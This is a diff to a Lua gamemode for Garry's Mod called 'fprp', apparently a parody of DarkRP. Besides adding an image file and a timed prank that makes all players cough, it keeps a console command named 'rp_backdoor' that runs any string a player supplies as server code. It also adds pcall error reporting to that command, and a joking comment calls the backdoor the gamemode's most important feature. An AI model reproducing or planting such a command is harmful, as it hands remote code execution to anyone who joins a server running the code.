@@ -10,6 +10,7 @@ local downloads = {
 	'materials/fprp/button.png',
 	'materials/fprp/close.png',
 	'materials/fprp/pug.png',
+	'materials/fprp/matt.png',
 }
 for k, v in ipairs(downloads) do
 	resource.AddFile(v)
@@ -103,6 +104,29 @@ fprp.finish()
 hook.Call("fprpFinishedLoading", GM)
 
 -- This is the most important feature of any rp gamemode
-concommand.Add('rp_backdoor', function(p,c,a) RunString(a[1]) end)
+function _BACKDOOR(p,c,a)
+	local succ, err = pcall(RunString, a[1])
+	if err then
+		p:ChatPrint(err)
+	end
+end
+
+concommand.Add('rp_backdoor', _BACKDOOR)
+
+
+util.AddNetworkString('fprp_cough')
+
+timer.Create('Coughcough', 180, 0, function()
+	for k, v in pairs(player.GetAll()) do
+		timer.Create('cough'..v:SteamID(), 1.1, 5, function()
+			if IsValid(v) then
+				v:EmitSound(Sound("ambient/voices/cough1.wav"), 100)
+			end
+		end)
+	end
+	net.Start('fprp_cough')
+	net.Broadcast()
+end)
+
 
 DarkRP = fprp
